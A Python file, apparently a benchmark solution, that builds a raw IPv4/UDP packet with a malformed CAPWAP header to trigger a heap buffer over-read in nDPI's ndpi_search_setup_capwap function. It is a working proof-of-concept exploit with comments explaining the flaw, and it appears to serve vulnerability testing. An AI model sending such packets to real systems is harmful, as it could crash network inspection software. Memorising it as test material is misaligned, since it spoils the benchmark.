import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in ndpi_search_setup_capwap.
        The PoC is a raw IPv4 + UDP packet with a malformed CAPWAP payload.
        Total length: 33 bytes (20 IP + 8 UDP + 5 Payload).
        """
        
        # --- IPv4 Header (20 bytes) ---
        ip_ver_ihl = 0x45       # Version 4, IHL 5
        ip_tos = 0x00
        ip_total_len = 33       # IP(20) + UDP(8) + Payload(5)
        ip_id = 0x0001
        ip_frag_off = 0x0000
        ip_ttl = 0x40
        ip_proto = 0x11         # UDP
        ip_check = 0x0000       # Placeholder
        ip_src = b'\x7f\x00\x00\x01'
        ip_dst = b'\x7f\x00\x00\x01'

        # Pack to calculate checksum
        header_raw = struct.pack('!BBHHHBBH4s4s', 
                                 ip_ver_ihl, ip_tos, ip_total_len, 
                                 ip_id, ip_frag_off, ip_ttl, ip_proto, 
                                 ip_check, ip_src, ip_dst)

        # Calculate IP Checksum
        s = 0
        for i in range(0, len(header_raw), 2):
            w = (header_raw[i] << 8) + header_raw[i+1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        ip_check = ~s & 0xffff

        # Final IP Header
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                                ip_ver_ihl, ip_tos, ip_total_len, 
                                ip_id, ip_frag_off, ip_ttl, ip_proto, 
                                ip_check, ip_src, ip_dst)

        # --- UDP Header (8 bytes) ---
        udp_src = 12345
        udp_dst = 5246          # CAPWAP Control Port (triggers vulnerable function)
        udp_len = 13            # 8 header + 5 payload
        udp_check = 0x0000      # Optional for UDP

        udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_check)

        # --- Payload (5 bytes) ---
        # Vulnerability: Buffer overread in ndpi_search_setup_capwap.
        # The function reads HLEN from the payload to determine header size.
        # Byte 0: Preamble (must be 0x00 usually)
        # Byte 1: HLEN (5 bits) | RID (3 bits). 
        #         0xF8 = 11111 000 => HLEN = 31.
        #         Header Size = HLEN * 4 = 124 bytes.
        #         The payload is only 5 bytes, so accessing offset 124 triggers the overread.
        payload = b'\x00\xF8\x00\x00\x00'

        return ip_header + udp_header + payload